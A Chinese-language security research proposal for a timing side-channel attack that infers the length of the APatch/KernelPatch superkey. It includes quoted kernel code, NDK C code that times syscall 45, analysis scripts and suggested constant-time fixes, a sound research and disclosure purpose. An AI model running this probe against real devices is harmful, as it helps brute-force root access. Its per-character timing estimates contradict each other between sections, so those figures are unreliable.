# 基于时间侧信道的 APatch SuperKey 长度推断实验方案

## 摘要

本文档提出一种针对 APatch/KernelPatch `auth_superkey()` 实现缺陷的时间侧信道攻击实验方案。由于 `auth_superkey()` 采用**固定长度、不提前退出**的逐字节异或循环，其执行时间与 `superkey` 长度呈线性关系。通过高精度计时和统计滤波，攻击者可以在不持有 superkey 的情况下，将 superkey 的长度搜索空间从 `0~128` 显著缩小，从而提升后续暴力破解或针对性攻击的效率。

> **可行性评估**：该方案在理论和源码层面成立，但工程实践中受 Android 调度噪声、DVFS、中断等因素影响，信噪比较低，属于**高阶研究性检测/攻击手段**，不适合作为常规 App 的 root 检测器。

---

## 1. 源码层面的脆弱性分析

### 1.1 `auth_superkey()` 的实现

`KernelPatch/kernel/base/predata.c`：

```c
int auth_superkey(const char *key)
{
    int rc = 0;
    for (int i = 0; superkey[i]; i++) {
        rc |= (superkey[i] ^ key[i]);
    }
    if (!rc) goto out;

    if (!enable_root_key) goto out;
    // ... SHA256 分支（极少数情况触发）
out:
    return !!rc;
}
```

**关键脆弱点**：
1. **无提前退出（No Early Exit）**：`rc |= (superkey[i] ^ key[i])` 是位或操作。即使第 0 个字节就不匹配，`rc` 变为非零，循环仍会继续遍历整个 `superkey` 直到遇到 `\0`。
2. **内容无关性**：对于攻击者传入的任意错误 key，循环迭代次数**完全只由 `superkey` 长度决定**，与 key 的具体内容无关。
3. **分支可预测**：在正常场景下（`enable_root_key = false`），`auth_superkey()` 在明文对比失败后立即 `goto out`，不会进入 SHA256 重运算分支。

### 1.2 `before` 钩子中的完整路径

`kernel/patch/common/supercall.c`：

```c
static void before(hook_fargs6_t *args, void *udata)
{
    // ... 参数解析
    long cmd = ver_xx_cmd & 0xFFFF;
    if (cmd < SUPERCALL_HELLO || cmd > SUPERCALL_MAX) return;

    char key[MAX_KEY_LEN];
    long len = compat_strncpy_from_user(key, ukey, MAX_KEY_LEN);
    if (len <= 0) return;

    int is_key_auth = 0;
    if (!auth_superkey(key)) {
        is_key_auth = 1;
    } else if (!strcmp("su", key)) {
        // ...
    } else {
        return;  // 错误 key 直接返回，不设置 skip_origin
    }
    // ...
}
```

对于 `syscall(45, fake_key, 0x1000)`（有效 cmd，错误 key），内核执行路径为：
1. **hook 入口跳板**：保存寄存器、调整栈帧（固定开销）
2. **`compat_strncpy_from_user`**：拷贝 `fake_key` 到内核栈（与 `fake_key` 长度成正比）
3. **`auth_superkey()`**：遍历 `superkey`（与 `superkey` 长度成正比）
4. **失败返回**：`else { return; }`，不设置 `skip_origin`

### 1.3 为什么 `strncpy_from_user` 不会掩盖 `auth_superkey` 的信号？

我们可以控制**传入的 `fake_key` 长度固定**（例如固定为 64 字节）。此时：
- `strncpy_from_user` 的时间是**常量**（对同一设备、同一长度而言）。
- `auth_superkey` 的时间是**变量**（随目标 `superkey` 长度变化）。

通过**差分法**（见第 4 节），可以将固定开销（hook 跳板、`strncpy`）抵消掉，只保留 `auth_superkey` 的变量部分。

---

## 2. 攻击模型

### 2.1 假设条件
- 目标设备已安装 APatch，且 `__NR_supercall = 45` 被 KernelPatch 劫持。
- 攻击者**不知道 superkey**。
- 攻击者可以执行 native 代码（通过 NDK），并能够使用高精度计时器（`CNTVCT_EL0`）。
- `enable_root_key` 为 `false`（默认/常见场景），确保不会触发 SHA256 分支的额外噪音。

### 2.2 攻击目标
推断 `superkey` 的精确长度 `L`，将暴力搜索空间从 `Σ(95^i)` 缩小为 `95^L`。

> 注意：由于循环不提前退出，该侧信道**无法逐字节恢复 superkey 内容**，只能泄露其长度。

---

## 3. 实验设计

### 3.1 测量策略：双样本差分

我们需要构建两组测量，其差异仅来源于 `auth_superkey` 的循环次数：

**基线样本（A）**：`syscall(45, fixed_key_64, 0x1)`
- `cmd = 0x1`（超出有效范围）
- `before` 钩子在前两行就 `return`：
  ```c
  if (cmd < SUPERCALL_HELLO || cmd > SUPERCALL_MAX) return;
  ```
- **不执行** `strncpy_from_user` 和 `auth_superkey`

**测试样本（B）**：`syscall(45, fixed_key_64, 0x1000)`
- `cmd = SUPERCALL_HELLO`（有效）
- **完整执行** `strncpy_from_user` + `auth_superkey`

**差分信号**：
```
Δt = median(B) - median(A)
   ≈ T_strncpy(64) + T_auth(L)
```

其中 `T_strncpy(64)` 对于固定设备和固定 key 长度是一个**常量**。如果我们能通过校准（例如使用已知 superkey 长度的测试设备）测得 `T_strncpy(64)` 的基准值，或者通过多次改变 fake_key 长度做线性回归，就可以解出 `T_auth(L)`，进而推断 `L`。

### 3.2 更精确的校准方法：改变 fake_key 长度

如果我们改变传入的 `fake_key` 长度（例如 16、32、48、64、80、96、128），测量对应的 `Δt`，可以得到一组数据：

```
Δt(len_fake) = C_trampoline + T_strncpy(len_fake) + T_auth(L)
```

在 ARM64 Linux 内核中，`strncpy_from_user` 的时间与拷贝长度近似线性关系：
```
T_strncpy(len) ≈ α * len + β
```

因此：
```
Δt(len_fake) ≈ α * len_fake + (C_trampoline + β + T_auth(L))
```

通过线性回归求出斜率 `α` 后，截距中包含了 `T_auth(L)`。但这个方法的问题在于，截距中还混有 `C_trampoline` 等固定开销，单独从截距推断 `L` 需要一台**已知 L 的校准设备**。

### 3.3 更实用的推断策略：相对时间指纹

由于 `T_auth(L)` 非常微弱（每个字符循环约 2~5 条 ARM64 指令，即 1~3 纳秒/字符），绝对值测量很难跨设备比较。更实用的方法是：

1. 对**同一台设备**，测量 `Δt(len_fake=64)`。
2. 在同一台设备上，通过 root 权限读取 `/data/adb/ap/superkey`（仅在实验室可控环境下），获得真实长度 `L_groundtruth`。
3. 建立该设备的"长度-时间指纹库"：测量 `L = 4, 8, 12, ..., 64` 时的 `Δt`。
4. 将指纹库泛化到同型号、同内核版本的设备上（因为 CPU 频率和微架构相同，`T_auth(L)` 的相对比例是稳定的）。

---

## 4. 核心检测代码（NDK C）

```c
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sched.h>

#define __NR_supercall 45
#define SUPERCALL_HELLO 0x1000
#define NUM_SAMPLES 200000  // 需要极大样本量

static inline uint64_t read_cntvct_el0() {
    uint64_t val;
    __asm__ volatile ("isb\n\tmrs %0, cntvct_el0\n\tisb" : "=r"(val));
    return val;
}

static int compare_u64(const void *a, const void *b) {
    uint64_t ua = *(const uint64_t *)a;
    uint64_t ub = *(const uint64_t *)b;
    return (ua > ub) - (ua < ub);
}

static uint64_t measure_baseline(int num_samples) {
    uint64_t *samples = (uint64_t *)malloc(num_samples * sizeof(uint64_t));
    volatile long dummy = 0;

    for (int i = 0; i < num_samples; i++) {
        uint64_t start = read_cntvct_el0();
        dummy += syscall(__NR_supercall, "AAAAAAAAAAAAAAAA", 0x1L);
        uint64_t end = read_cntvct_el0();
        samples[i] = end - start;
    }

    qsort(samples, num_samples, sizeof(uint64_t), compare_u64);
    uint64_t median = samples[num_samples / 2];
    free(samples);
    return median;
}

static uint64_t measure_test(const char *fake_key, int num_samples) {
    uint64_t *samples = (uint64_t *)malloc(num_samples * sizeof(uint64_t));
    volatile long dummy = 0;

    for (int i = 0; i < num_samples; i++) {
        uint64_t start = read_cntvct_el0();
        dummy += syscall(__NR_supercall, fake_key, 0x1000L);
        uint64_t end = read_cntvct_el0();
        samples[i] = end - start;
    }

    qsort(samples, num_samples, sizeof(uint64_t), compare_u64);
    uint64_t median = samples[num_samples / 2];
    free(samples);
    return median;
}

// 绑定到大核
static void bind_big_core() {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(4, &cpuset);  // 假设 CPU 4 为大核，需根据设备调整
    sched_setaffinity(0, sizeof(cpuset), &cpuset);
}

// 实验入口
void experiment() {
    bind_big_core();

    // 1. 基线：cmd 无效，不执行 auth_superkey
    uint64_t baseline = measure_baseline(NUM_SAMPLES);

    // 2. 测试：固定长度 fake_key，触发完整路径
    char fake_key[129];
    memset(fake_key, 'A', 64);
    fake_key[64] = '\0';
    uint64_t test_time = measure_test(fake_key, NUM_SAMPLES);

    // 3. 差分信号（以 CNTVCT 计数为单位，需根据 CPU 频率换算为 ns）
    uint64_t delta = test_time - baseline;

    // 后续：将 delta 与指纹库比对，推断 superkey 长度
}
```

---

## 5. 数据分析方法

### 5.1 去噪：中位数 + IQR 滤波

由于 Android 调度器可能随机插入中断处理（如触摸屏中断、定时器中断），直接使用平均值会被极端值严重拉偏。建议：
1. 对每个样本数组排序后取 **中位数**。
2. 计算 **IQR（四分位距）**，剔除超出 `[Q1 - 1.5*IQR, Q3 + 1.5*IQR]` 的异常值后，再取中位数。

### 5.2 建立指纹库

在已知 superkey 长度的校准设备上，测量不同 `L` 对应的 `Δt`：

```python
import numpy as np

# 示例指纹库（同一设备，同一 fake_key 长度）
fingerprints = {
    4:  1250,  # CNTVCT counts
    8:  1265,
    12: 1280,
    16: 1295,
    20: 1310,
    24: 1325,
}

# 未知设备测量值
measured_delta = 1288

# 寻找最接近的 L
best_L = min(fingerprints.keys(), key=lambda L: abs(fingerprints[L] - measured_delta))
print(f"Inferred superkey length: {best_L}")
```

### 5.3 线性回归模型（可选）

如果改变 `fake_key` 长度进行多组测量，可以用线性回归分离 `strncpy` 和 `auth_superkey` 的贡献：

```python
import numpy as np

# fake_key 长度与对应 Δt
lengths = np.array([16, 32, 48, 64, 80, 96])
deltas  = np.array([1100, 1150, 1200, 1250, 1300, 1350])

# 拟合：delta = alpha * length + intercept
alpha, intercept = np.polyfit(lengths, deltas, 1)

# T_auth(L) = intercept - C_trampoline_beta
# 需要校准设备确定 C_trampoline_beta
```

---

## 6. 局限性与误差源

| 误差源 | 影响 | 缓解方法 |
|--------|------|---------|
| **DVFS（动态调频）** | CPU 频率变化导致单条指令周期数波动 | 绑大核、开启高性能模式、增大样本量 |
| **中断/调度抢占** | 内核执行期间被中断，引入微秒级异常值 | IQR 剔除异常值、关中断（需 root，不可行） |
| **Cache 状态** | `superkey` 是否命中 D-Cache 影响读取延迟 | 预热 cache（多次调用后再采样）、多次重启 App 测量 |
| **TLB miss** | `strncpy_from_user` 触发的页表遍历延迟 | 使用同一 fake_key 地址、避免跨页边界 |
| **Branch prediction** | `for` 循环的分支预测器状态 | 不可控，但影响通常 <10ns |
| **SHA256 分支** | 若 `enable_root_key = true`，会引入数微秒噪音 | 测量前先用已知错误 key 触发几次，确保走冷路径；若观察到异常大值，可能说明进入了 SHA256 分支 |

**最致命的局限**：`T_auth(L)` 的信号强度可能只有 **50~200 纳秒/字符**，而 Android 用户态的基线噪声通常在 **500ns~2us** 级别。这意味着：
- 对于短 superkey（如 4~8 字符），信号可能完全被噪声淹没。
- 对于长 superkey（如 32~64 字符），信号可能达到 **2~10 微秒**，在高精度测量和数十万样本下可能可分辨。

---

## 7. 防御建议

### 7.1 固定时间 `auth_superkey`
将 `auth_superkey` 改写为**固定时间实现**，使循环次数恒定（例如总是迭代 `MAX_KEY_LEN = 128` 次），不随实际 superkey 长度变化：

```c
int auth_superkey_fixed_time(const char *key)
{
    int rc = 0;
    for (int i = 0; i < SUPER_KEY_LEN; i++) {
        rc |= (superkey[i] ^ key[i]);
    }
    // ...
}
```

### 7.2 随机填充 superkey
将 superkey 实际内容存储在随机偏移位置，前面用随机数据填充，总长度恒定为 128。这样即使攻击者测出循环 128 次，也只知道最大长度。

### 7.3 前置快速失败
在 `auth_superkey` 之前加入一个**快速哈希检查**（如 CRC32），若快速哈希不匹配则直接返回，不进入逐字节循环。这会将绝大多数探测请求拦截在 `auth_superkey` 之前。

### 7.4 减少 `strncpy_from_user` 的泄漏
使用 `copy_from_user_nofault` 替代 `strncpy_from_user`，并固定读取 128 字节（即使 key 更短），使拷贝时间也恒定化。

---

## 8. 结论

APatch `auth_superkey()` 的"无提前退出、长度相关"循环设计，构成了一个**理论上可利用的时间侧信道**。攻击者可以通过高精度计时推断 superkey 的长度，从而缩小后续攻击的搜索空间。

然而，由于 Android 系统的强噪声环境，该侧信道在工程实践中的可靠性较低，更适合作为**安全研究的 PoC**，而非大规模部署的检测/攻击手段。修复该漏洞的最佳方案是在 KernelPatch 源码中引入**固定时间的 key 认证机制**。
